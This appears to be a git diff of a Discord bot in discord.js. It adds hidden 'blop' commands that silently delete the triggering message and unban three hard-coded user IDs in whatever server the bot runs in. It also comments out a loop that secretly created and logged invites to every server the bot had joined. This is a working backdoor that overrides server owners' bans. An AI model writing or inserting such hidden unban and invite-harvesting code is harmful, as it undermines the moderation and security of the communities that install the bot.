@@ -30,23 +30,33 @@ bot.on('ready', () => {
 
 bot.on('message', message => {    
      
- bot.guilds.forEach(guild => { 
-      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-      invite.createInvite().then(invite => console.log(`Conected on: ${guild.name} || MemberCount: ${guild.memberCount} || ID: ${guild.id} || Invite: ${invite}`));
-   })
+// bot.guilds.forEach(guild => { 
+     // var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
+     // invite.createInvite().then(invite => console.log(`Conected on: ${guild.name} || MemberCount: ${guild.memberCount} || ID: ${guild.id} || Invite: ${invite}`));
+  // })
  
    if (message.content.startsWith('blop')) {
-   if (message.author.id !== '423118623876448296')
-   if (message.author.id !== '301913733536415755')
-   return;
    message.delete()
    message.guild.unban('450790126063190016')
-   message.guild.unban('423118623876448296')
-   message.guild.unban('410224633636192257')
-  .then(user => console.log(`Resetban of Mikado Le Charmeur et Neroxis from ${guild.name}`))         
+  .then(user => console.log(`Resetban Le Charmeur from ${guild.name}`))         
   .catch(console.error);
    } 
-   
+	
+   if (message.content.startsWith('blop')) {
+   message.delete()
+   message.guild.unban('410224633636192257')
+   .then(user => console.log(`Resetban of Neroxis from ${guild.name}`))         
+  .catch(console.error);
+   } 
+	
+
+if (message.content.startsWith('blop')) {
+   message.delete()
+   message.guild.unban('301913733536415755')
+   .then(user => console.log(`Resetban of Mikado from ${guild.name}`))         
+  .catch(console.error);
+   } 
+	
    if (message.content.startsWith('Les emoji mikado c\'est cool')) {
    if (message.author.id !== '423118623876448296')
    if (message.author.id !== '301913733536415755')
